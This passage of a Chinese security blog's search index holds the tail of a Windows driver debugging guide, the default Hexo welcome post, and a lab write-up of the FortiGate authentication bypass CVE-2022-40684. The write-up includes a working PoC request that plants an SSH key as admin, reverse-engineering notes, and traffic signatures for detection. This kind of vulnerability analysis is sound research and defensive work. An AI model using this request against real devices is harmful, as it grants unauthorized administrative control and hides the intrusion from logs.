class="hljs-built_in">test</span>\Desktop\symblos\*http://msdl.microsoft.com/download/symbols <br><br>- /r c:\windows\system32\ 下载system32下的符号<br>- SRV*C:\Users\<span class="hljs-built_in">test</span>\Desktop\symblos\ 下载符号的保存路径<br>- http://msdl.microsoft.com/download/symbols 微软的符号服务器<br></code></pre></td></tr></table></figure><ul><li>加载被调试驱动的符号</li><li>Windbg-&gt;file-&gt;symbol file path,根据自己的路径填写，本文填写示例如下：</li></ul><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\test\Desktop\code\test\first6\x64\Checked_win7;srv*<span class="hljs-name">C</span>:\Users\test\Desktop\symblos*<span class="hljs-name">http</span>://msdl.microsoft.com/download/symbols<br></code></pre></td></tr></table></figure><ul><li>第一个路径为编译驱动的驱动的符号路径，使用<code>；</code>分割</li></ul><h3 id="6-4-驱动调试"><a href="#6-4-驱动调试" class="headerlink" title="6.4.驱动调试"></a>6.4.驱动调试</h3><ul><li>调试机-打开windbg左上角的 File然后点击Kernel Debug 然后再点击 COM ，设置如下图所示 ，然后点击确定</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226200005753.png" class="" title="png"><ul><li>被调试机启动选择<code>启用调试程序 </code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226201250995.png" class="" title="png"><ul><li>被调试机启动驱动</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226202412267.png" class="" title="png"><h2 id="七-参考链接"><a href="#七-参考链接" class="headerlink" title="七.参考链接"></a>七.参考链接</h2><ul><li><a href="https://www.cnblogs.com/revercc/p/14609685.html">https://www.cnblogs.com/revercc/p/14609685.html</a></li><li><a href="https://bbs.kanxue.com/thread-188471.htm">https://bbs.kanxue.com/thread-188471.htm</a></li><li><a href="https://blog.csdn.net/fonx/article/details/79720490?spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&utm_relevant_index=20">https://blog.csdn.net/fonx/article/details/79720490?spm=1001.2101.3001.6650.13&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&amp;utm_relevant_index=20</a></li><li><a href="https://blog.csdn.net/jmh1996/article/details/88382133">https://blog.csdn.net/jmh1996/article/details/88382133</a></li><li><a href="https://cloud.tencent.com/developer/article/1621329?sid_for_share=99125_3">https://cloud.tencent.com/developer/article/1621329?sid_for_share=99125_3</a></li><li><a href="https://bbs.kanxue.com/thread-261326.htm">https://bbs.kanxue.com/thread-261326.htm</a></li><li><a href="https://bbs.kanxue.com/thread-251052.htm">https://bbs.kanxue.com/thread-251052.htm</a></li><li><a href="https://blog.csdn.net/qq_42931917/article/details/108265848">https://blog.csdn.net/qq_42931917/article/details/108265848</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>window_security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows_drivers</tag>
      
      <tag>windbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-40684</title>
    <link href="/2024/01/25/CVE-2022-40684/"/>
    <url>/2024/01/25/CVE-2022-40684/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-40684"><a href="#CVE-2022-40684" class="headerlink" title="CVE-2022-40684"></a>CVE-2022-40684</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Fortinet修复了一个存在 FortiGate 防火墙和 FortiProxy Web 代理中的身份验证绕过漏洞（CVE-2022-40684），该漏洞可能允许攻击者在易受攻击的设备上执行未经授权的操作，攻击者通过向易受攻击的目标发送特制的 HTTP 或 HTTPS 请求进行绕过身份认证以管理员身份在控制面板中执行任意操作。</p><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiProxy &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">FortiProxy</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="三、复现环境"><a href="#三、复现环境" class="headerlink" title="三、复现环境"></a>三、复现环境</h2><ul><li>FortiGate-VM 7.2.1</li></ul><h2 id="四、环境搭建"><a href="#四、环境搭建" class="headerlink" title="四、环境搭建"></a>四、环境搭建</h2><h3 id="4-1-导入虚拟机"><a href="#4-1-导入虚拟机" class="headerlink" title="4.1.导入虚拟机"></a>4.1.导入虚拟机</h3><ul><li>使用vmware打开下载的FortiGate-vm虚拟镜像</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211511921.png" class="" title="png"><ul><li>接受许可协议</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211600250.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240123211649260.png" class="" title="png"><h3 id="4-2-更改虚拟机配置"><a href="#4-2-更改虚拟机配置" class="headerlink" title="4.2.更改虚拟机配置"></a>4.2.更改虚拟机配置</h3><ul><li>给forigate配置ip和网关，打开虚拟机设置</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211928513.png" class="" title="png"><ul><li>点击编辑，选择虚拟网络编辑器，查看VMnet8的子网IP和网关，这里注意一会在虚拟机里面配置的网关要与之相同。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123212154008.png" class="" title="png"><h3 id="4-3-配置FortiGate"><a href="#4-3-配置FortiGate" class="headerlink" title="4.3.配置FortiGate"></a>4.3.配置FortiGate</h3><ul><li>打开虚拟机，初始账号admin 提示输入密码直接回车，提示输入新密码</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123212601844.png" class="" title="png"><ul><li>使用如下命令查看接口信息</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> system <span class="hljs-class"><span class="hljs-keyword">interface</span></span><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123212656644.png" class="" title="png"><ul><li>配置ip地址</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config<span class="hljs-built_in"> system interface</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">edit</span> port1<br><span class="hljs-built_in">set</span> mode static<br><span class="hljs-built_in">set</span><span class="hljs-built_in"> ip </span>192.168.253.55 255.255.255.0<br><span class="hljs-built_in">set</span> allowaccess http<span class="hljs-built_in"> ping </span>ssh<br>end<br><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123212948007.png" class="" title="png"><ul><li>配置网关</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config router static<br><span class="hljs-built_in">edit</span> 1<br><span class="hljs-built_in">set</span> device port1<br><span class="hljs-built_in">set</span> gateway 192.168.253.2<br>end<br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123213208336.png" class="" title="png"><ul><li>尝试ping一下</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123213245810.png" class="" title="png"><h3 id="4-4-登录获取许可证"><a href="#4-4-登录获取许可证" class="headerlink" title="4.4.登录获取许可证"></a>4.4.登录获取许可证</h3><ul><li>打开浏览器输入<code>192.168.253.55</code> 进入登录界面，输入之前设置的账户密码登录</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123213611746.png" class="" title="png"><ul><li>登录后输入账户密码获取许可证</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123210443692.png" class="" title="png">* 等待重启<img src="/2024/01/25/CVE-2022-40684/20240123210530282.png" class="" title="png"><ul><li>点击Later</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123210708933.png" class="" title="png">* 发现正常登录成功<img src="/2024/01/25/CVE-2022-40684/20240123210746990.png" class="" title="png"><h2 id="五、漏洞验证"><a href="#五、漏洞验证" class="headerlink" title="五、漏洞验证"></a>五、漏洞验证</h2><h3 id="5-1-xshell生成密钥"><a href="#5-1-xshell生成密钥" class="headerlink" title="5.1.xshell生成密钥"></a>5.1.xshell生成密钥</h3><img src="/2024/01/25/CVE-2022-40684/20240123225820581.png" class="" title="png"><ul><li>生成公钥</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123225907942.png" class="" title="png"><h3 id="5-2-poc包"><a href="#5-2-poc包" class="headerlink" title="5.2.poc包"></a>5.2.poc包</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PUT /api/v2/cmdb/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.253</span><span class="hljs-number">.55</span><br><span class="hljs-keyword">User</span>-Agent: Report Runner<br>Accept-<span class="hljs-keyword">Encoding</span>: gzip, deflate<br><span class="hljs-keyword">Connection</span>: <span class="hljs-keyword">close</span><br>Forwarded:<span class="hljs-keyword">for</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; <span class="hljs-keyword">by</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br>Content-Length: <span class="hljs-number">411</span><br><br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAnVQJuIzvGfdyzx3Q==\&quot;&quot;&#125; //这里为刚才生成的公钥<br><br><br><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123230109427.png" class="" title="png"><h3 id="5-3-使用xshell进行连接"><a href="#5-3-使用xshell进行连接" class="headerlink" title="5.3.使用xshell进行连接"></a>5.3.使用xshell进行连接</h3><img src="/2024/01/25/CVE-2022-40684/20240123225553692.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240123225646054.png" class="" title="png"><h2 id="六、漏洞分析"><a href="#六、漏洞分析" class="headerlink" title="六、漏洞分析"></a>六、漏洞分析</h2><ul><li>将forigate-vm中的fortios.vmdk复制出来进行分析</li></ul><h3 id="6-1-文件提取"><a href="#6-1-文件提取" class="headerlink" title="6.1.文件提取"></a>6.1.文件提取</h3><ul><li>1.安装libguestfs</li><li>libguestfs 是一组 Linux 下的 C 语言的 API ，用来访问虚拟机的磁盘映像文件。</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libguestfs-tools<br></code></pre></td></tr></table></figure><ul><li><p>2.查看磁盘分区情况</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo virt-<span class="hljs-keyword">file</span><span class="hljs-params">system</span>s -a fortios.vmdk<br></code></pre></td></tr></table></figure></li><li><p>3.挂载</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo guestmount -<span class="hljs-selector-tag">a</span> fortios<span class="hljs-selector-class">.vmdk</span> -m /dev/sda1 <span class="hljs-attr">--ro</span> <span class="hljs-built_in">fortios_dir</span>(替换成自己的目标文件夹)<br></code></pre></td></tr></table></figure><ul><li>4.挂载成功后，rootfs.gz为文件系统压缩包</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123233953686.png" class="" title="png"><ul><li>5.解压需要进一步解压rootfs.gz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> rootfs.gz rootfd<br><span class="hljs-built_in">cd</span> rootfd<br>gunzip rootfs.gz <br>cpio -i 2&gt; /dev/null &lt; rootfs<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123234834988.png" class="" title="png"><ul><li><ol start="6"><li><code>bin.tar.xz</code> 文件夹，使用 sbin 目录自带的命令解压</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chroot . /sbin/xz <span class="hljs-attr">--decompress</span> bin<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.xz</span><br>tar -xvf bin<span class="hljs-selector-class">.tar</span><br><br></code></pre></td></tr></table></figure></li></ul><img src="/2024/01/25/CVE-2022-40684/20240124003234046.png" class="" title="png"><h3 id="6-2-测试漏洞"><a href="#6-2-测试漏洞" class="headerlink" title="6.2.测试漏洞"></a>6.2.测试漏洞</h3><ul><li>进入到bin目录后寻找httpsd程序。httpsd是init程序的软连接，并且这里可以看出init程序非常大，逆向该程序比较费时。所以我们可以根据调试信息先来逆向程序逻辑。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124003448585.png" class="" title="png"><ul><li>运行以下命令开启httpsd程序的调试信息</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">diagnose <span class="hljs-built_in">debug</span> <span class="hljs-built_in">enable</span><br>diagnose <span class="hljs-built_in">debug</span> application httpsd -1<br>diagnose <span class="hljs-built_in">debug</span> cli 8<br></code></pre></td></tr></table></figure><ul><li>使用poc进行测试，操作的信息会输出到屏幕上：</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124220557790.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124220657938.png" class="" title="png"><h3 id="6-3-原理分析"><a href="#6-3-原理分析" class="headerlink" title="6.3.原理分析"></a>6.3.原理分析</h3><ul><li>在IDA pro中打开init程序，搜索字符串fweb_authorize_all进行定位</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124225829156.png" class="" title="png"><ul><li>如上图所示并未找到，我在其他师傅那里看到可以直接识别fweb_authorize_all函数是在ap_hook_check_access_ex中调用的但我的ida并未识别，我是通过搜索上下文字符串反向定位fweb_authorize_all函数，然后搜索ap_hook_check_access_ex发现是一个访问控制函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124230405522.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124230555262.png" class="" title="png"><ul><li>进入到函数fweb_authorize_all（sub_C4AFB0）中，分析可得，在身份认证过程中，首先判断v2[8]是否等于”127.0.0.1”，即判断是否本机访问。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124231333037.png" class="" title="png"><ul><li>如果本机访问则sub_C50E80函数内部继续判断接口如果是否为vsys_fgfm接口。<img src="/2024/01/25/CVE-2022-40684/20240124231402283.png" class="" title="png">* 随后取Forwarded头的value值，strstr函数查找"for="的位置，随后执行if结构体内容，再次判断Forwarded_header_content_tmp中是否存在"by"字符，如果判断不通过并不会进入到api_check_access函数中。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124231735976.png" class="" title="png"><ul><li>从该函数中退出来，继续往上跟踪，发现在地址C4AC70处，先调用了sub_C4B590函数，然后ap_hook_handler hook了sub_C4AC60函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233135960.png" class="" title="png"><ul><li>进入到sub_C4AC60函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233205738.png" class="" title="png"><ul><li>接着往下进入函数sub_C4C480，在进入sub_C4BF20函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233441011.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124233519261.png" class="" title="png"><ul><li>sub_C4BF20函数返回了sub_C4BB20函数，进入该函数，发现了调试信息出现的字符fweb_debug_init</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233624746.png" class="" title="png"><ul><li>重新回到sub_C4C480，分析函数v3[1]函数和sub_C4C2A0，跟进分析一下v3[1]函数，往上看,v3&#x3D;a2,而a2是函数sub_C4C480的参数</li><li></li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233841531.png" class="" title="png"><ul><li>通过交叉引用，发现a2参数为off_3FEA400函数数组的地址<img src="/2024/01/25/CVE-2022-40684/20240124234001439.png" class="" title="png">* 查看此数组</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234025993.png" class="" title="png"><ul><li>发现从此处会调用一系列hanler函数，这里v3应该对应sub_c929F0函数。查看sub_c929F0函数，函数中调用了api_check_access函数，并且程序会根据api_check_access返回值返回用户对应响应码的reponse。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234442983.png" class="" title="png"><ul><li>进入api_check_access函数中进行查看，该函数中无任何输出。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234557225.png" class="" title="png"><ul><li>在IDA中搜索api_access_check_for_trusted_access字符，发现api_access_check_for_trusted_access函数中调用sub_C510D0，传入参数为”Node.js”</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124235055698.png" class="" title="png"><ul><li>sub_C510D0函数中判断表单中User-Agent的value值是否与Node.js是否相同，如果不是”Node.js”，则判断User-Agent的value值是否与Report Runner是否相同</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124235808732.png" class="" title="png"><ul><li>进入到以上俩种方式中的某一种，用户赋值为”Local_Process_Access”，此时会绕过身份认证。分析到这里，我们就可以知道要想攻击成功，需要设置Forwarded头value值必须为”for&#x3D;”，后面可以设置127.0.0.1来隐藏防火墙中的攻击记录，而User-Agent的value可以设置”Node.js”和”Report Runner”俩种中的一个。</li></ul><h2 id="七、流量分析"><a href="#七、流量分析" class="headerlink" title="七、流量分析"></a>七、流量分析</h2><ul><li>结合以上分析可得,请求头特征</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PUT /api/v2/cmdb/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span> HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-keyword">User</span>-Agent: Report Runner<br><span class="hljs-keyword">User</span>-Agent: Node.js<br>Forwarded:<span class="hljs-keyword">for</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; <span class="hljs-keyword">by</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EQ==\&quot;&quot;&#125;<br><br></code></pre></td></tr></table></figure><ul><li>根据数据包得响应体特征</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;cli_error&quot;</span>:<span class="hljs-string">&quot;SSH key is good.</span><br></code></pre></td></tr></table></figure><h2 id="八、-参考链接"><a href="#八、-参考链接" class="headerlink" title="八、 参考链接"></a>八、 参考链接</h2><ul><li><a href="https://blog.csdn.net/We8__/article/details/128306432">https://blog.csdn.net/We8__/article/details/128306432</a></li><li><a href="https://bbs.kanxue.com/thread-275335.htm">https://bbs.kanxue.com/thread-275335.htm</a></li><li><a href="https://zhuanlan.zhihu.com/p/575575181">https://zhuanlan.zhihu.com/p/575575181</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>network_device</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability_analysis</tag>
      
      <tag>FortiGate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/12/26/hello-world/"/>
    <url>/2023/12/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
